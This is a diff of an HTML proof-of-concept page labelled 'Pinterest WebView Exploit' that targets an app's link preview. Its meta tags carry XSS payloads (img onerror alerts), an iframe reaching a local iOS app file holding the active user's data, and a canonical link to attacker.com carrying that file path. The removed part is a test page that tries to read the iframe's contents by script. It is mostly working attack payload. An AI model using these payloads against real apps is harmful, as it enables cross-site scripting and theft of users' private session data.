@@ -1,52 +1,16 @@
-<!-- <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
   <head>
     <title>Hacked 😈</title>
-    <meta name="description" content='This is a Hacked 😈 pin <img src=x onerror=alert("XSS")>'>
+    <meta name="description" content='<iframe src="file:///private/var/mobile/Containers/Data/Application/DE1F2730-70D5-4898-AA09-B584FBCDEC23/Documents/activeUser"></iframe>'>
     <meta property="og:title" content='"><img src=x onerror=alert("OG-XSS")>'>
-    <link rel="canonical" href="https://attacker.com/malicious?file=/private/var/mobile/DE1F2730-70D5-4898-AA09-B584FBCDEC23/Documents/activeUser">
+    <link rel="canonical" href="https://attacker.com/malicious?file:///private/var/mobile/Containers/Data/Application/DE1F2730-70D5-4898-AA09-B584FBCDEC23/Documents/activeUser">
 
   </head>
   <body>
     <h1>Pinterest WebView Exploit</h1>
 
   </body>
-</html> -->
-
-
-
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Iframe File Access Test</title>
-</head>
-<body>
-  <h1>Testing iframe with file://</h1>
-
-  <iframe 
-    src="file:///private/var/mobile/Containers/Data/Application/DE1F2730-70D5-4898-AA09-B584FBCDEC23/Documents/activeUser" 
-    width="100%" 
-    height="300" 
-    style="border:1px solid red;">
-  </iframe>
-
-  <script>
-    // مجرد لوج عشان تعرف إن الصفحة اشتغلت
-    console.log("Page loaded, iframe injected");
-
-    // محاولة قراءة iframe.contentWindow مثلاً (هتفشل غالبًا بسبب الـ SOP)
-    setTimeout(() => {
-      try {
-        const iframe = document.querySelector("iframe");
-        const doc = iframe.contentDocument || iframe.contentWindow.document;
-        alert("Iframe content: " + doc.body.innerHTML);
-      } catch (e) {
-        console.error("Error accessing iframe content:", e);
-        alert("Access denied to iframe content");
-      }
-    }, 3000);
-  </script>
-</body>
 </html>
 
 
